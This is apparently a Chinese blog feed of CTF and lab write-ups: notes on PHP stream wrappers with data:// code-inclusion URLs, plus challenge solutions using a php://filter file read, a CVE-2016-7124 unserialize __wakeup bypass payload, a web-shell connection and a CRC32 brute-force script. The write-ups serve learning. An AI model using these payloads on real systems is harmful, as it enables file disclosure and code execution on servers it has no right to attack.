<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">allow_url_fopen</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">允许读取</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">允许写入</td>
<td align="left">Yes（除了 <em>zip://</em>）</td>
</tr>
<tr>
<td align="left">允许附加</td>
<td align="left">Yes（除了 <em>zip://</em>）</td>
</tr>
<tr>
<td align="left">允许同时读写</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php" target="_blank" rel="noopener">stat()</a></td>
<td align="left">No，请使用普通的 <em>file://</em> 封装器统计压缩文件。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank" rel="noopener">unlink()</a></td>
<td align="left">No，请使用 <em>file://</em> 封装器删除压缩文件。</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php" target="_blank" rel="noopener">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php" target="_blank" rel="noopener">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank" rel="noopener">rmdir()</a></td>
<td align="left">No</td>
</tr>
</tbody></table>
<h4 id="1-zip-协议"><a href="#1-zip-协议" class="headerlink" title="1. zip://协议"></a>1. zip://协议</h4><p>zip:// [压缩文件路径]#[压缩文件内的子文件]</p>
<p>测试失败 ,报错</p>
<p><strong>【bzip2://协议】</strong></p>
<p><strong>使用方法：</strong></p>
<p>compress.bzip2://[压缩文件地址]</p>
<p>测试失败 没有返回数据</p>
<h4 id="3-zlib-协议"><a href="#3-zlib-协议" class="headerlink" title="3. zlib://协议"></a>3. zlib://协议</h4><p>compress.zlib://[压缩文件地址]</p>
<p><img src="../pic/20.png" alt=""></p>
<h3 id="0x04-data"><a href="#0x04-data" class="headerlink" title="0x04 data://"></a>0x04 data://</h3><p>经过测试官方文档上存在问题，经过测试data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">支持</th>
</tr>
</thead>
<tbody><tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen" target="_blank" rel="noopener">allow_url_fopen</a></td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">受限于 <a href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener">allow_url_include</a></td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">允许读取</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">允许写入</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">允许追加</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">允许同时读写</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.stat.php" target="_blank" rel="noopener">stat()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.unlink.php" target="_blank" rel="noopener">unlink()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rename.php" target="_blank" rel="noopener">rename()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.mkdir.php" target="_blank" rel="noopener">mkdir()</a></td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">支持 <a href="https://www.php.net/manual/zh/function.rmdir.php" target="_blank" rel="noopener">rmdir()</a></td>
<td align="left">No</td>
</tr>
</tbody></table>
<p><a href="http://localhost/temp.php?file=data://text/plain" target="_blank" rel="noopener">http://localhost/temp.php?file=data://text/plain</a>,<?php phpinfo()?></p>
<p><a href="http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=" target="_blank" rel="noopener">http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
<p><a href="http://localhost/temp.php?file=data:text/plain" target="_blank" rel="noopener">http://localhost/temp.php?file=data:text/plain</a>,<?php phpinfo()?></p>
<p><a href="http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=" target="_blank" rel="noopener">http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>
<p><img src="../pic/21.png" alt=""></p>
<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p><img src="../pic/22.png" alt=""></p>
]]></content>
      <categories>
        <category>日常积累</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录6-极客大挑战web1</title>
    <url>/2020/01/02/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%956-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web1/</url>
    <content><![CDATA[<h1 id="极客大挑战web"><a href="#极客大挑战web" class="headerlink" title="极客大挑战web"></a>极客大挑战web</h1><h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>查看源码,发现提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        &lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">    echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>payload=<code>?cat=dog</code></p>
<a id="more"></a>

<p><img src="../pic/9.png" alt=""></p>
<h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><p>万能密码直接获取结果</p>
<p><img src="../pic/10.png" alt=""></p>
<h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>使用菜刀或者蚁剑连接 密码Syc</p>
<p><img src="../pic/11.png" alt=""></p>
<p>flag在根目录下</p>
<h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot; &gt;</span><br><span class="line">#master &#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    left:44%;</span><br><span class="line">    bottom:0;</span><br><span class="line">    text-align :center;</span><br><span class="line">        &#125;</span><br><span class="line">        p,h1 &#123;</span><br><span class="line">                cursor: default;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">                &lt;title&gt;蒋璐源的秘密&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">        &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">            &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;你想知道蒋璐源的秘密么？&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">            &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;想要的话可以给你，去找吧！把一切都放在那里了！&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;Archive_room.php&quot; style&#x3D;&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;div style&#x3D;&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>点击其中的链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot; &gt;</span><br><span class="line">#master	&#123;</span><br><span class="line">    position:absolute;</span><br><span class="line">    left:44%;</span><br><span class="line">    bottom:20;</span><br><span class="line">    text-align :center;</span><br><span class="line">    	&#125;</span><br><span class="line">        p,h1 &#123;</span><br><span class="line">                cursor: default;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;绝密档案&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">	&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;</span><br><span class="line">		我把他们都放在这里了，去看看吧		&lt;br&gt;</span><br><span class="line">		&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;action.php&quot; style&#x3D;&quot;background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;&quot;&gt;</span><br><span class="line">			&lt;font size&#x3D;6&gt;SECRET&lt;&#x2F;font&gt;</span><br><span class="line">		&lt;&#x2F;a&gt;</span><br><span class="line">	&lt;div style&#x3D;&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>再次点击链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">        p,h1 &#123;</span><br><span class="line">                cursor: default;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;END&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">	&lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;查阅结束&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;没看清么？回去再仔细看看吧。&lt;&#x2F;p&gt;</span><br><span class="line">		&lt;div style&#x3D;&quot;position: absolute;bottom: 0;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>和之前南邮cft的一道web有点像</p>
<p>直接上burp suite</p>
<p>一直点，查看记录，发现有一个</p>
<p><img src="../pic/12.png" alt=""></p>
<p>打开发现源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p><code>payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php</code></p>
<p>将得到的base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;æå°±å¨è¿é&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;d144e819-346a-49ab-98e7-2fea0b2b9f6d&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;htmlPgo</span><br></pre></td></tr></table></figure>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>常规扫描手工or御剑，发现<code>www.zip</code>存在源码</p>
<p>class.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;    &#x2F;&#x2F;此处需要绕过</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;new Name(&#39;admin&#39;,100);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>index.php中关键代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   include &#39;class.php&#39;;</span><br><span class="line">   $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">   $res&#x3D;unserialize(@$select);</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;Syc&#123;dog_dog_dog_dog&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析后这是一个序列化+绕过<code>__wakeup()</code>  </p>
<p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
<p><code>serialize()</code> 会检查是否存在一个 <code>__sleep()</code> 方法。如果存在，则会先调用 <code>__sleep()</code> 。</p>
<p><code>CVE-2016-7124</code>提到<code>unserialize()</code> 绕过<code>__wakeup()</code>的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;admin&#39;;</span><br><span class="line">    private $password &#x3D; 100;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new Name();</span><br><span class="line">var_dump(urlencode(serialize($a))); &#x2F;&#x2F;O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="line">var_dump(serialize($a));&#x2F;&#x2F;O:4:&quot;Name&quot;:2:&#123;s:14:&quot;�Name�username&quot;;s:5:&quot;admin&quot;;s:14:&quot;�Name�password&quot;;i:100;&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>因为有不可打印字符，所以选择经过URL编码后的</p>
<p><code>payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</code></p>
<p><img src="../pic/13.png" alt=""></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>元旦安恒月赛</title>
    <url>/2020/01/02/%E5%85%83%E6%97%A6%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="安恒元旦月赛"><a href="#安恒元旦月赛" class="headerlink" title="安恒元旦月赛"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>
<a id="more"></a>

<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="爆破鬼才"><a href="#爆破鬼才" class="headerlink" title="爆破鬼才"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>
<p>解压后还是一个压缩包</p>
<p><img src="../pic/6.png" alt=""></p>
<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x7d90ee19</span>   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    <span class="keyword">print</span>  s</span><br></pre></td></tr></table></figure>

<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>
<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>
<p>最后跑出来的密码是20140224。拿着key解密</p>
<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>
<p><img src="../pic/7.png" alt=""></p>
<p>玩了一把后查看源码，发现有一个js。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS Planet defense game<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"canvas"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点进去拉到最后有几条提示</p>
<p><img src="../pic/8.png" alt=""></p>
<p>生成一个http请求，将分数发到服务器，将结果显示。</p>
<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class="line">Host: 183.129.189.60:10001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class="line"></span><br><span class="line">record&#x3D;23</span><br></pre></td></tr></table></figure>

<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>安恒月赛2020</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>年末总结</title>
    <url>/2019/12/31/%E5%B9%B4%E6%9C%AB%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">U2FsdGVkX182LyDctpB02aV0vXXs4ZmsqHBtjuaMozMmvHqeJUL4J/gkjc9YThcMc7LVqixgw76FB5WnQ9YIhjbiNW9p8+qS7qy7yFgT5BsWLH1JdqK90tjpqBtHv6MRb8/EhNADqbeHI+NHnr3GFlnM/XfV8AVUTDjRXX9UrtSZjrsVgr9m71TcGak/VshsG5RoqHrZ22M20pzvL+wICta10amzDcbsq+QR864IRTBcYlDgYq7UIgGxM9e1Bhw2YOpTlSrRP/x1HgHrfhEC1XqvLkeyW/75k639fedX0st8ht0vgJC4opwp9BCRKYBlsrM6iuogMByvMZfZ6qHAb+VKaTo2M2u+f0s+lacm4WMU/uTrpMEpnDRyeXwQ3eg4Dy9uiACGRaJbluqbA9wCDaraULaLVV22kuxYQYB2Smbl59Irf3L9vLXy93hzvzxEIrX7bXNihKOkjqcg5byMOvxqiZonSJ0YI/JXSefikw69QLQ2lo92jfRG80MG85cBUGb6NLYL2Niu9bySbTNfzyl1BYyQ4GdhwqwlILiATDlMCB81zsgvkQKK/GzO4813ExtiRV2to8fegBzkLXrlibXDjaggd1SqI0ZKAO2Q0SxgrmtrSwBzpOgRmQHvg/7+M0kcXghNFhgAoRM/6sRsNk37XISF9JYkd33CnXs9zuFgvkqoNWXVv1kf13bvmxkqycbEOEr0535RG4Lu4GF1ItSVBIdrsBqqQH9bGujiZG6a8OzS5yloCJkURJpWJWpQK95YTheZ4V56u9OI1IFCTOamDSXqxa7jZW77Ap5ip+GtVENl4qr3KSsLo6qMUjadmyb/X4flv1CEEwsWb4hzlbexJF/FbUAmFwleNy0UzKJc0KtCpfAJK387sUjzdqMsulzDr4pQI9RmxJYOJJawoakr9aHlmRqP4se2SFK6AkR7ViPb9VV9UAcLZ4T6XDSRfxi42yW3oEvMAdlE/LZlpOl/y+JYFCxetpHu4Kjjtu9vlBTL8phcQ5NXnA/OJenZxJ6Jp/HaYtsY2lNMhWvrCh4v9R2pGIa0IIcBBZovV0WoP/n/ZCukcnSzdtUrrnzCt4jFZejcTyyffN1bNmNVT3zTv5zH1lmYQY/gG1tWyRfs7kfpHV1ON5lzCgbPpj31Blm